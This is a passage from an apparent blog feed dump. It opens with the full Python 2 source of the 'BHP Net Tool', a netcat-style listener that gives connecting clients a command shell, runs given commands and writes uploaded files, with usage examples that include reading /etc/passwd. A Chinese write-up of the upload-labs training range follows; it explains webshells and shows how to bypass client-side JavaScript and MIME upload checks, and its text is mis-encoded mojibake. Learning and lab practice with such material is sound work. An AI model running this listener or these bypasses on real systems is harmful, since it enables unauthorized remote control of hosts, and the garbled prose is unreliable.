class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> getopt</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">listen                 = <span class="literal">False</span></span><br><span class="line">command                = <span class="literal">False</span></span><br><span class="line">upload                 = <span class="literal">False</span></span><br><span class="line">execute                = <span class="string">""</span></span><br><span class="line">target                 = <span class="string">""</span></span><br><span class="line">upload_destination     = <span class="string">""</span></span><br><span class="line">port                   = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"BHP Net Tool"</span></span><br><span class="line">    <span class="keyword">print</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Usage: BHP_server.py -t target_host -p port"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"-l --listen  - listen on [host]:[port] for incoming connections"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"-e --execute=file_to_run - execute the given file upon receiving a connection"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"-c --command -initialize a command shell"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"-u --upolad=destination  - upon receiving connection ypload a file and write to [destination]"</span></span><br><span class="line">    <span class="keyword">print</span> </span><br><span class="line">    <span class="keyword">print</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Examples:  "</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"BHP_server.py -t 192.168.0.1 -p 5555 -l -c"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"BHP_server.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"BHP_server.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\" "</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"echo 'ABCDEFGHI' | ./BHP_server.py -t 192.168.11.12 -p 135"</span></span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client_sender</span><span class="params">(buffer)</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#global target</span></span><br><span class="line">    <span class="comment">#global port      </span></span><br><span class="line">    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        client.connect((target, port))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> len(buffer):</span><br><span class="line">            client.send(buffer)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            </span><br><span class="line">            recv_len = <span class="number">1</span></span><br><span class="line">            response = <span class="string">""</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">while</span> recv_len:</span><br><span class="line">                data = client.recv(<span class="number">4096</span>)</span><br><span class="line">                recv_len = len(data)</span><br><span class="line">                response += data</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> recv_len &lt; <span class="number">4096</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line">            <span class="keyword">print</span> response</span><br><span class="line">            buffer = raw_input(<span class="string">""</span>)</span><br><span class="line">            buffer += <span class="string">"\n"</span></span><br><span class="line">            </span><br><span class="line">            client.send(buffer)</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span>   <span class="string">"[*]    Exception! Exiting."</span></span><br><span class="line">        client.close()</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server_loop</span><span class="params">()</span> :</span></span><br><span class="line">    <span class="keyword">global</span> target </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> len(target) :</span><br><span class="line">        target = <span class="string">"0.0.0.0"</span></span><br><span class="line">    </span><br><span class="line">    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    server.bind((target,port))</span><br><span class="line">    </span><br><span class="line">    server.listen(<span class="number">5</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span> :</span><br><span class="line">        client_socket, add = server.accept()</span><br><span class="line">        </span><br><span class="line">        client_thread = threading.Thread(target=client_handler, args=(client_socket,))</span><br><span class="line">        client_thread.start()</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_command</span><span class="params">(command)</span>:</span></span><br><span class="line">    command = command.rstrip()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        output = subprocess.check_output(command,stderr=subprocess.STDOUT,shell=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        output = <span class="string">"Failed to execute command.\r\n"</span></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client_handler</span><span class="params">(client_socket)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> upload</span><br><span class="line">    <span class="keyword">global</span> execute</span><br><span class="line">    <span class="keyword">global</span> command</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> len(upload_destination):</span><br><span class="line">        file_buffer = <span class="string">""</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data=client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span> :</span><br><span class="line">                file_buffer += data</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            file_descriptor = open(upload_destination,<span class="string">"wb"</span>)</span><br><span class="line">            file_descriptor.write(file_buffer)</span><br><span class="line">            file_descriptor.close()</span><br><span class="line">            </span><br><span class="line">            client_socket.send(<span class="string">"Successfully saved file to %s\r\n"</span>%upload_destination)</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">except</span>: </span><br><span class="line">            client_socket.send(<span class="string">"Failed to save file to %s\r\n"</span>%upload_destination)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> len(execute):</span><br><span class="line">        output = run_command(execute)</span><br><span class="line">        client_socket.send(output)</span><br><span class="line">    <span class="keyword">if</span> command:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span> :</span><br><span class="line">            client_socket.send(<span class="string">"&lt;BHP:#&gt; "</span>)</span><br><span class="line">            </span><br><span class="line">            cmd_buffer = <span class="string">""</span></span><br><span class="line">            <span class="keyword">while</span> <span class="string">"\n"</span> <span class="keyword">not</span> <span class="keyword">in</span> cmd_buffer:</span><br><span class="line">                cmd_buffer += client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">            response = run_command(cmd_buffer)</span><br><span class="line">            client_socket.send(response)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">global</span> listen</span><br><span class="line">    <span class="keyword">global</span> port</span><br><span class="line">    <span class="keyword">global</span> execute</span><br><span class="line">    <span class="keyword">global</span> command</span><br><span class="line">    <span class="keyword">global</span> upload_destination</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> len(sys.argv[<span class="number">1</span>:]):</span><br><span class="line">        usage()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        opts, args = getopt.getopt(sys.argv[<span class="number">1</span>:], <span class="string">"hle:t:p:cu:"</span>, [<span class="string">"help"</span>, <span class="string">"listen"</span>, <span class="string">"execute"</span>, <span class="string">"target"</span>, <span class="string">"port"</span>, <span class="string">"command"</span>, <span class="string">"upload"</span>])</span><br><span class="line">    <span class="keyword">except</span> getopt.GetoptError <span class="keyword">as</span> err:</span><br><span class="line">        <span class="keyword">print</span> str(err)</span><br><span class="line">        usage()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> o, a <span class="keyword">in</span> opts:</span><br><span class="line">        <span class="keyword">if</span> o <span class="keyword">in</span> (<span class="string">"-h"</span>, <span class="string">"--help"</span>):</span><br><span class="line">            usage()</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-l"</span>, <span class="string">"--listen"</span>):</span><br><span class="line">            listen = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-e"</span>, <span class="string">"--execute"</span>):</span><br><span class="line">            execute = a</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span>(<span class="string">"-c"</span>, <span class="string">"--command"</span>):</span><br><span class="line">            command = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span>(<span class="string">"-u"</span>, <span class="string">"--upload"</span>):</span><br><span class="line">            upload_destination = a</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span>(<span class="string">"-t"</span>, <span class="string">"--target"</span>):</span><br><span class="line">            target = a</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span>(<span class="string">"-p"</span>, <span class="string">"--port"</span>):</span><br><span class="line">            port = int(a)</span><br><span class="line">        <span class="keyword">else</span>:   </span><br><span class="line">            <span class="keyword">assert</span> <span class="literal">False</span>,<span class="string">"Unhandled Option"</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> listen <span class="keyword">and</span> len(target) <span class="keyword">and</span> port &gt; <span class="number">0</span>:</span><br><span class="line">        buffer = sys.stdin.read()</span><br><span class="line">        client_sender(buffer)</span><br><span class="line">    <span class="keyword">if</span> listen:</span><br><span class="line">        server_loop()</span><br><span class="line">    </span><br><span class="line">main()</span><br></pre></td></tr></table></figure>]]></content>
      
        
        <tags>
            
            <tag> æœåŠ¡å™¨ ubuntu pythonç½‘ç»œç¼–ç¨‹ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ä¸Šä¼ æ¼æ´]]></title>
      <url>/2019/07/08/%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<h1 id="ä¸Šä¼ æ¼æ´"><a href="#ä¸Šä¼ æ¼æ´" class="headerlink" title="ä¸Šä¼ æ¼æ´"></a>ä¸Šä¼ æ¼æ´</h1><h2 id="å‡†å¤‡é˜¶æ®µ"><a href="#å‡†å¤‡é˜¶æ®µ" class="headerlink" title="å‡†å¤‡é˜¶æ®µ"></a>å‡†å¤‡é˜¶æ®µ</h2><ol>
<li>é˜…è¯»äº†GitHubä¸Šçš„<a href="https://github.com/c0ny1/upload-labs/blob/master/README.md#11-%E4%B8%BB%E7%95%8C%E9%9D%A2" target="_blank" rel="noopener">é¡¹ç›®æ–‡æ¡£</a>åï¼Œç¨å¾®å¿ƒé‡Œæœ‰äº†ç‚¹æ•°ã€‚<br>è¿…é€Ÿcloneäº†é¡¹ç›®çš„ä»£ç åï¼Œå‘ç°æ˜¯phpæ–‡ä»¶ï¼Œæƒ³è¿è¡Œè¦å…ˆéƒ¨ç½²ç¯å¢ƒ</li>
</ol>
<ul>
<li>Windowsä¸‹ï¼š<br>  æ¨è<a href="http://phpstudy.php.cn/download.html" target="_blank" rel="noopener">PHPStudyç¨‹åºåŒ…</a>ï¼Œé›†æˆäº†<code>Apache</code>+<code>PHP</code>+<code>MySQL</code>+<code>phpMyAdmin</code>+<code>ZendOptimizer</code>ï¼Œä¸€é”®å®‰è£…ï¼Œå‚»ç“œå¼æ“ä½œã€‚</li>
<li>Linuxä¸‹ï¼š<br>  æˆ‘çš„æœåŠ¡å™¨å·²ç»æå‰è£…å¥½äº†<code>Apache</code>+<code>MySQL</code>+<code>phpMyAdmin</code>ï¼Œå¯ä»¥å‚è€ƒæˆ‘æ­å»ºæœåŠ¡å™¨ç¯å¢ƒæ—¶çš„æ•™ç¨‹<a href="https://cloud.tencent.com/developer/labs/lab/10122" target="_blank" rel="noopener">https://cloud.tencent.com/developer/labs/lab/10122</a></li>
</ul>
<ol start="2">
<li>å®‰è£…å¥½ PHPStudy åï¼Œæ‰¾åˆ°ç½‘ç«™æ ¹ç›®å½•åï¼ŒæŠŠé¡¹ç›®çš„.phpæ–‡ä»¶æ”¾å…¥æ­¤ç›®å½•ã€‚linuxåŒç†ã€‚<br> æ‰“å¼€æµè§ˆå™¨ï¼Œè¾“å…¥<a href="http:localhost/upload-labs-master" target="_blank" rel="noopener">http:localhost/upload-labs-master</a>,èƒ½æ˜¾ç¤ºè¢«è§£æåçš„phpæ–‡ä»¶ï¼Œè¯´æ˜ç¯å¢ƒå·²ç»é…ç½®å¥½äº†ã€‚</li>
</ol>
<h2 id="çŸ¥è¯†é“ºå«"><a href="#çŸ¥è¯†é“ºå«" class="headerlink" title="çŸ¥è¯†é“ºå«"></a>çŸ¥è¯†é“ºå«</h2><p>å…¶å®ä¸€ç›´ä»¥æ¥æˆ‘å¯¹ç½‘é¡µçš„è¿ä½œæ–¹å¼ä¹Ÿæ˜¯ä¸€ç›´åŠè§£ï¼Œ <code>PHP</code>,<code>JavaScript</code>,<code>HTML</code>,<code>css</code>ä»€ä¹ˆçš„å‚»å‚»åˆ†ä¸æ¸…æ¥š,å’Œåˆ«äººèŠèµ·çš„æ—¶å€™ä¹Ÿæ˜¯ä¸€å¤´é›¾æ°´. ç›´åˆ°å‰å‡ å¤©åˆšåˆšæŠŠè¿™ä¸ªåšå®¢çœŸæ­£æ­èµ·æ¥ï¼Œæ‰å¯¹<code>HTML</code>å’Œ<code>PHP</code>çš„å…³ç³»æœ‰ç‚¹ç†è§£äº†. ä»Šå¤©ä¸ºäº†åé¢çš„å­¦ä¹ , æœ‰å¿…è¦æŠŠè¿™éƒ¨åˆ†çš„çŸ¥è¯†å¥½å¥½è¡¥ä¹ ä¸‹äº†.<br>ä¸»è¦å‚è€ƒ:<a href="https://blog.csdn.net/qq_41147260/article/details/80840298" target="_blank" rel="noopener">ä½ çŸ¥é“HTMLã€CSSã€JSã€Servicesã€PHPã€ASP.NET æ˜¯ä»€ä¹ˆæ¥å¤´ä¹ˆï¼Ÿ</a></p>
<p>###HTML<br><code>HTML</code>ä¸»è¦ä½œç”¨äºå‰ç«¯(æµè§ˆå™¨å¤„).  ä»¥æˆ‘ä¸ªäººçš„ç†è§£ï¼Œ<code>HTML</code>å°±å¥½åƒæ˜¯ä¸ªæˆå“,æ˜¯å¯ä»¥ç›´æ¥è¢«æµè§ˆå™¨ç†è§£çš„æ–‡ä»¶. å½“è‡ªå·±çš„ç”µè„‘å¾—åˆ°ä¸€ä¸ª <code>html</code>é¡µé¢ä¹‹åï¼Œå°±ä¼šå¯¹å®ƒè¿›è¡Œè§£æã€‚<code>HTML</code> å°±æ˜¯ä¸€ç§è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€ã€‚</p>
<p>###PHP<br>ä¸<code>HTML</code>ç›¸å¯¹åº”, <code>PHP</code>ä¸»è¦åº”ç”¨äºæœåŠ¡å™¨ç«¯,ä¸»è¦ç”¨æ¥å†™æœåŠ¡å™¨è„šæœ¬.å…¶å®<code>PHP</code>å†™æˆçš„æœåŠ¡å™¨è„šæœ¬æœ¬è´¨ä¸Šå°±æ˜¯ä¸ªç¨‹åº, è€Œä¸”æ˜¯ä¸“é—¨==å¤„ç†å®¢æˆ·ç«¯ä¼ æ¥çš„æ•°æ®ã€è°ƒç”¨æœ¬åœ°æ•°æ®æœ€åç”Ÿæˆ<code>HTML</code>æ–‡ä»¶çš„ç¨‹åº==ã€‚è¿™ä¸€ç‚¹ä¸Š,<code>PHP</code>å†™æˆçš„æœåŠ¡å™¨è„šæœ¬å°±å¥½åƒæ˜¯ä¸ª<code>HTML</code>çš„ç”Ÿæˆå™¨. å½“ç„¶, æœåŠ¡å™¨å¯ä»¥ç›´æ¥æŠŠé¢„å…ˆè®¾è®¡å¥½çš„æˆå“<code>HTML</code>ä¸¢ç»™å®¢æˆ·ç«¯, ä¸è¿‡è¿™æ ·çš„çµæ´»æ€§å°±å¤§å¤§é™ä½äº†, æ¯ä¸ªäººçœ‹åˆ°çš„åŒä¸€ä¸ªç½‘é¡µéƒ½æ˜¯ä¸€æ¨¡ä¸€æ ·çš„, è€Œä¸”ç½‘ç«™ä¹Ÿæ²¡æ³•å“åº”ç”¨æˆ·çš„å…¶å®ƒè¯·æ±‚.</p>
<p>###CSS<br>csså¯ä»¥å¯¹<code>html</code>ç½‘é¡µè¿›è¡Œæ¸²æŸ“. å¦‚æœä¸ç”¨cssï¼Œæ•ˆæœå¦‚ä¸‹å›¾ï¼ŒæŒ‰ç…§æµè§ˆå™¨é»˜è®¤çš„æ ·å¼æ˜¾ç¤ºå‡ºè¡¨æ ¼ï¼Œè¶…é“¾æ¥ç­‰ã€‚</p>
<figure class="image-box">
                <img src="http://p9.pstatp.com/large/47120003f1ab6a490727" alt title class>
                <p></p>
            </figure>
<p>(å…¶å®å°±æ˜¯ç›®å‰çœ‹æˆ‘åšå®¢çš„æ•ˆæœâ€¦â€¦)<br>ä¸è¯´äº†, æˆ‘å­¦csså»äº†ã€‚(æºœ)</p>
<p>###Javascript<br> <code>Javascriptï¼ˆJSï¼‰</code>å¯ä»¥ç»™é¡µé¢æ·»åŠ ä¸€äº›åŠ¨æ€çš„æ•ˆæœï¼Œæ¯”å¦‚å¤´æ¡çš„å‘è¡¨çš„æ ‡ç­¾ï¼Œé¼ æ ‡ç§»ä¸Šå»ä¼šå¼¹å‡ºä¸€ä¸ªå°çª—å£ï¼Œè¿™ä¸ªå°±æ˜¯ JS å®ç°çš„æ•ˆæœå•¦ã€‚<strong>æµè§ˆå™¨</strong>æ‹¿åˆ°è¿™æ ·çš„ä»£ç ï¼Œ<strong>å°±ä¼šè§£æå¹¶å®ç°</strong>å‡ºç›¸åº”çš„æ•ˆæœã€‚ä¸”ç”±é»‘å­—å¯çŸ¥, JavaScriptæ˜¯è¿è¡Œåœ¨æµè§ˆå™¨ä¸Šçš„, ä¸æ¶‰åŠæœåŠ¡å™¨.<br> å…¶å®ç”¨æ¥å†™æµè§ˆå™¨è„šæœ¬çš„ï¼Œä¹Ÿä¸æ˜¯éå¾—JavaScript ä¸å¯ï¼Œä¸è¿‡æ˜¯å„å¤§æµè§ˆå™¨éƒ½é»˜è®¤äº†ï¼šè¯·ç”¨ JS å†™è¿™äº›åŠ¨æ€æ•ˆæœçš„ä»£ç ç»™æˆ‘è§£æ~</p>
<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><blockquote>
<p>webshellå°±æ˜¯ä»¥aspã€phpã€jspæˆ–è€…cgiç­‰ç½‘é¡µæ–‡ä»¶å½¢å¼å­˜åœ¨çš„ä¸€ç§å‘½ä»¤æ‰§è¡Œç¯å¢ƒï¼Œä¹Ÿå¯ä»¥å°†å…¶ç§°åšä¸ºä¸€ç§ç½‘é¡µåé—¨ã€‚é»‘å®¢åœ¨å…¥ä¾µäº†ä¸€ä¸ªç½‘ç«™åï¼Œé€šå¸¸ä¼šå°†aspæˆ–phpåé—¨æ–‡ä»¶ä¸ç½‘ç«™æœåŠ¡å™¨WEBç›®å½•ä¸‹æ­£å¸¸çš„ç½‘é¡µæ–‡ä»¶æ··åœ¨ä¸€èµ·ï¼Œç„¶åå°±å¯ä»¥ä½¿ç”¨æµè§ˆå™¨æ¥è®¿é—®aspæˆ–è€…phpåé—¨ï¼Œå¾—åˆ°ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œç¯å¢ƒï¼Œä»¥è¾¾åˆ°æ§åˆ¶ç½‘ç«™æœåŠ¡å™¨çš„ç›®çš„ã€‚<br>é¡¾åæ€ä¹‰ï¼Œâ€œwebâ€çš„å«ä¹‰æ˜¯æ˜¾ç„¶éœ€è¦æœåŠ¡å™¨å¼€æ”¾webæœåŠ¡ï¼Œâ€œshellâ€çš„å«ä¹‰æ˜¯å–å¾—å¯¹æœåŠ¡å™¨æŸç§ç¨‹åº¦ä¸Šæ“ä½œæƒé™ã€‚webshellå¸¸å¸¸è¢«ç§°ä¸ºå…¥ä¾µè€…é€šè¿‡ç½‘ç«™ç«¯å£å¯¹ç½‘ç«™æœåŠ¡å™¨çš„æŸç§ç¨‹åº¦ä¸Šæ“ä½œçš„æƒé™ã€‚ç”±äºwebshellå…¶å¤§å¤šæ˜¯ä»¥åŠ¨æ€è„šæœ¬çš„å½¢å¼å‡ºç°ï¼Œä¹Ÿæœ‰äººç§°ä¹‹ä¸ºç½‘ç«™çš„åé—¨å·¥å…·ã€‚</p>
</blockquote>
<p>çœ‹ä¸æ‡‚, ä¸è¿‡åº”è¯¥ä¹Ÿæ²¡å…³ç³», éšç€ä¸‹é¢çš„é¢˜ç›®åº”è¯¥ä¼šå¯¹è¿™äº›æ¦‚å¿µæœ‰æ›´åŠ æ¸…æ™°çš„è®¤è¯†, ä¸å¦¨å¸¦ç€é—®é¢˜, å¼€å¯å­¦ä¹ ä¹‹è·¯.</p>
<h3 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“:"></a>å°ç»“:</h3><ul>
<li>HTMLè´Ÿè´£æ”¾ä½ éœ€è¦æ˜¾ç¤ºçš„å†…å®¹ï¼Œ</li>
<li>PHPå¯ä»¥è¾“å‡ºå¯å˜åŒ–çš„HTMLã€‚</li>
<li>CSSå¯ä»¥è®©ä½ çš„HTMLæ›´åŠ çš„æ¼‚äº®ï¼Œæ¯”å¦‚åŠ å­—ä½“é¢œè‰²åŠ è¾¹æ¡†ã€‚</li>
<li>JSå¯ä»¥è®©ä½ HTML+CSSç»„æˆçš„é¡µé¢æ›´åŠ â€œç”ŸåŠ¨â€,ç²—æµ…çš„æ¥è¯´å°±æ˜¯JSè®©é¡µé¢ä¼šåŠ¨ã€‚</li>
<li>webshellæ˜¯ä»¥ç½‘é¡µæ–‡ä»¶å½¢å¼å­˜åœ¨çš„ä¸€ç§å‘½ä»¤æ‰§è¡Œç¯å¢ƒ</li>
</ul>
<h2 id="äºŒåé¢˜é¢˜è§£"><a href="#äºŒåé¢˜é¢˜è§£" class="headerlink" title="äºŒåé¢˜é¢˜è§£"></a>äºŒåé¢˜é¢˜è§£</h2><p>ç”±äºæˆ‘åœ¨è¿™ä¸ªä»»åŠ¡ä¸­è´Ÿè´£<code>pass15</code> è‡³ <code>pass18</code>,æ‰€ä»¥ä¹‹å‰çš„é¢˜ç›®å¯èƒ½ä¸ä¼šé€ä¸ªåˆ†æ, è¿˜è¯·è§è°….<br>-&gt;<a href="http://whoisyourdaddy.cf/upload-labs-master/" target="_blank" rel="noopener">é¶åœº</a>&lt;-<br>è€ƒè™‘åˆ°æœ¬ç«™æœåŠ¡å™¨å®‰å…¨é—®é¢˜, é¶åœºä¸å¼€æ”¾æäº¤æ–‡ä»¶åŠŸèƒ½, è¯·æœ‰éœ€è¦çš„æœ‹å‹æŒ‰ç…§ä¸Šé¢çš„ä»‹ç»è‡ªè¡Œéƒ¨ç½²é¶åœº. </p>
<h3 id="pass1"><a href="#pass1" class="headerlink" title="pass1:"></a>pass1:</h3><p>ç”±æç¤º</p>
<figure class="image-box">
                <img src="http://whoisyourdaddy.cf/picture/pass1tip.png" alt title class>
                <p></p>
            </figure>
<p>æ ¹æ®ä¸Šé¢çš„ä»‹ç», JavaScriptåªä¼šåœ¨æµè§ˆå™¨ä¸­è¿è¡Œ, æ‰€ä»¥æˆ‘ä»¬åœ¨æµè§ˆå™¨ä¸­ç¦ç”¨æ‰JavaScriptå°±è¡Œäº†.<br>ä»¥chromeæµè§ˆå™¨ä¸ºä¾‹.<br>é¦–å…ˆåœ¨pass1çš„é¡µé¢ä¸‹,ç‚¹å‡»<code>F12</code>,è°ƒå‡ºå¼€å‘è€…å·¥å…·.</p>
<figure class="image-box">
                <img src="http://whoisyourdaddy.cf/picture/å¼€å‘è€…å·¥å…·.png" alt title class>
                <p></p>
            </figure>
<p>ç„¶åç‚¹å‡»<code>F1</code>,æ‰“å¼€<code>settings</code></p>
<figure class="image-box">
                <img src="http://whoisyourdaddy.cf/picture/setting.png" alt title class>
                <p></p>
            </figure>
<p>åœ¨<code>setting</code>çš„<code>Preferences</code>çš„æœ«å°¾éƒ¨åˆ†,æœ‰ä¸ª<code>Disable JavaScript</code>,é¡¾åæ€ä¹‰,æ‰¾çš„å°±æ˜¯å®ƒäº†. é€‰ä¸­åå°±å¯ä»¥ç¦ç”¨JavaScript, æˆåŠŸä¸Šä¼ <code>php</code>ç±»å‹çš„æ–‡ä»¶, å®¡æŸ¥å…ƒç´ , å‘ç°æ­¤å¤„çš„å›¾ç‰‡æ˜¯<code>test.php</code>, è¯´æ˜æˆåŠŸäº†.</p>
<h3 id="pass2"><a href="#pass2" class="headerlink" title="pass2:"></a>pass2:</h3><p>å°è¯•ç›´æ¥æäº¤test.php, æ˜¾ç¤ºæ–‡ä»¶ç±»å‹ä¸åŒ¹é….<br>æŸ¥çœ‹ä¸‹æç¤º<figure class="image-box">
                <img src="http://whoisyourdaddy.cf/picture/pass2tips.png" alt title class>
                <p></p>
            </figure></p>
<p>å¥½äº†, ä»€ä¹ˆæ˜¯MIMEå‘¢?</p>
<blockquote>
<p>MIME(Multipurpose Internet Mail Extensions)å¤šç”¨é€”äº’è”ç½‘é‚®ä»¶æ‰©å±•ç±»å‹;åœ¨æœ€æ—©çš„HTTPåè®®ä¸­,æ²¡æœ‰é™„åŠ çš„æ•°æ®ç±»å‹ä¿¡æ¯.æ‰€æœ‰ä¼ é€çš„æ•°æ®éƒ½è¢«å®¢æˆ·ç¨‹åºè§£é‡Šä¸ºè¶…æ–‡æœ¬æ ‡è®°è¯­è¨€HTML æ–‡æ¡£ï¼Œè€Œä¸ºäº†æ”¯æŒå¤šåª’ä½“æ•°æ®ç±»å‹ï¼ŒHTTPåè®®ä¸­å°±ä½¿ç”¨äº†é™„åŠ åœ¨æ–‡æ¡£ä¹‹å‰çš„MIMEæ•°æ®ç±»å‹ä¿¡æ¯æ¥æ ‡è¯†æ•°æ®ç±»å‹ã€‚æ¯ä¸ªMIMEç±»å‹ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼Œå‰é¢æ˜¯æ•°æ®çš„å¤§ç±»åˆ«ï¼Œä¾‹å¦‚å£°éŸ³audioã€å›¾è±¡imageç­‰ï¼Œåé¢å®šä¹‰å…·ä½“çš„ç§ç±»ã€‚<br>Content-typeå°±æ˜¯æˆ‘ä»¬ç»å¸¸åœ¨ httpè¯·æ±‚å¤´é‡Œ response headerçœ‹åˆ°çš„é‚£ä¸ª<br>é‡Œé¢åŒ…å«çš„å°±æ˜¯MIMEä¿¡æ¯.<br>ä½œè€…ï¼š<a href="https://www.jianshu.com/p/fb5d8f03c4ed" target="_blank" rel="noopener">ç‹è¿›å–œè®¸ä¸‰å¤š</a></p>
</blockquote>
<p>çœ‹æ¥MIMEå°±æ˜¯åœ¨<code>HTTP</code>æ•°æ®åŒ…ä¸­æ ‡æ˜æ–‡ä»¶ç±»å‹çš„ä¸€ä¸ªå‚æ•°.<br>ä¸¾å‡ ä¸ªä¾‹å­<br>|ç±»å‹|åç¼€|content-type|<br>|:â€”:|:â€”:|:â€”:|<br>|è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€|.html|text/html|<br>|xmlæ–‡æ¡£|.xml|text/xml|<br>|XHTMLæ–‡æ¡£|.xhtml|application/xhtml+xml|<br>|æ™®é€šæ–‡æœ¬|.txt|text/plain|<br>|RTFæ–‡æœ¬|.rtf|application/rtf|<br>|PDFæ–‡æ¡£|.pdf|application/pdf|<br>|Microsoft Wordæ–‡ä»¶|.word|application/msword|<br>|PNGå›¾åƒ|.png|image/png|<br>|GIFå›¾å½¢|.gif|image/gif|<br>|JPEGå›¾å½¢|.jpeg,.jpg|image/jpeg|</p>
